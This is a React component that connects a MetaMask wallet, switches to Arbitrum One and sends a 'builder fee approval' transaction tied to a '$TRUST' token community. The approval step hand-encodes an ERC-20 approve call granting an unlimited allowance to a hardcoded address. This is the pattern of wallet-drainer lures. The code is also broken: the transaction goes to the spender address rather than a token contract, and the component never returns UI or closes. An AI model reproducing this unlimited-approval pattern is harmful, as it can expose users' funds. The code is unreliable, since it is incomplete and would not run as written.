const { useState, useEffect } = React;

function BuilderFeeApproval() {
 const [walletStatus, setWalletStatus] = useState('Not Connected');
 const [walletAddress, setWalletAddress] = useState('');
 const [responseMessage, setResponseMessage] = useState('');
 const [responseType, setResponseType] = useState('');
 const [chainId, setChainId] = useState(null);

 useEffect(() => {
   const checkConnection = async () => {
     if (!window.ethereum) return;
     
     try {
       const accounts = await window.ethereum.request({ method: 'eth_accounts' });
       if (accounts.length) {
         setWalletAddress(accounts[0]);
         setWalletStatus('Connected');
         const chain = await window.ethereum.request({ method: 'eth_chainId' });
         setChainId(chain);
       }
     } catch (err) {
       console.error(err);
     }
   };

   checkConnection();
   
   if (window.ethereum) {
     const handleChainChanged = () => window.location.reload();
     const handleAccountsChanged = (accounts) => {
       if (accounts.length === 0) {
         setWalletStatus('Not Connected');
         setWalletAddress('');
       }
     };

     window.ethereum.on('chainChanged', handleChainChanged);
     window.ethereum.on('accountsChanged', handleAccountsChanged);

     return () => {
       window.ethereum.removeListener('chainChanged', handleChainChanged);
       window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
     };
   }
 }, []);

 const handleChainSwitch = async () => {
   try {
     await window.ethereum.request({
       method: 'wallet_switchEthereumChain',
       params: [{ chainId: '0xa4b1' }]
     });
   } catch (error) {
     if (error.code === 4902) {
       try {
         await window.ethereum.request({
           method: 'wallet_addEthereumChain',
           params: [{
             chainId: '0xa4b1',
             chainName: 'Arbitrum One',
             nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
             rpcUrls: ['https://arb1.arbitrum.io/rpc'],
             blockExplorerUrls: ['https://arbiscan.io']
           }]
         });
       } catch (addError) {
         console.error('Failed to add Arbitrum network');
       }
     }
   }
 };

 const connectWallet = async () => {
   if (!window.ethereum) {
     setWalletStatus('MetaMask Not Detected');
     return;
   }

   try {
     const accounts = await window.ethereum.request({
       method: "eth_requestAccounts"
     });

     if (accounts.length > 0) {
       setWalletStatus('Connected');
       setWalletAddress(accounts[0]);
       const chain = await window.ethereum.request({ method: 'eth_chainId' });
       setChainId(chain);
     }
   } catch (error) {
     setWalletStatus('Connection Failed');
     console.error(error);
   }
 };

 const approveBuilderFee = async () => {
  if (!window.ethereum || !walletAddress) return;
  
  try {
    const builderAddress = "0x13e46cCd194ca86212236543d2e7376b00bafa42";
    
    // Create transaction parameters
    const transactionParameters = {
      to: builderAddress,
      from: walletAddress,
      // '0x095ea7b3' is the function selector for 'approve(address,uint256)'
      data: '0x095ea7b3' + 
            // Pad the address to 32 bytes
            builderAddress.slice(2).padStart(64, '0') +
            // Set max approval amount (uint256 max value)
            'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
    };

    setResponseMessage('Please confirm the transaction in MetaMask...');
    setResponseType('info');

    // Send transaction
    const txHash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [transactionParameters],
    });

    setResponseMessage('Transaction submitted! Waiting for confirmation...');
    
    // Wait for transaction confirmation
    const checkTransaction = setInterval(async () => {
      try {
        const receipt = await window.ethereum.request({
          method: 'eth_getTransactionReceipt',
          params: [txHash],
        });

        if (receipt) {
          clearInterval(checkTransaction);
          if (receipt.status === '0x1') {
            setResponseMessage('Builder Fee Approved Successfully! Welcome to the $TRUST fam 🦍');
            setResponseType('success');
          } else {
            setResponseMessage('Transaction failed. Please try again.');
            setResponseType('error');
          }
        }
      } catch (error) {
        clearInterval(checkTransaction);
        setResponseMessage('Failed to check transaction status');
        setResponseType('error');
      }
    }, 1000);

  } catch (error) {
    if (error.code === 4001) {
      setResponseMessage('Transaction rejected by user');
    } else {
      setResponseMessage('Failed to approve: ' + error.message);
    }
    setResponseType('error');
  }
};
// Initialize app
ReactDOM.createRoot(document.getElementById('root')).render(
 React.createElement(BuilderFeeApproval)
);
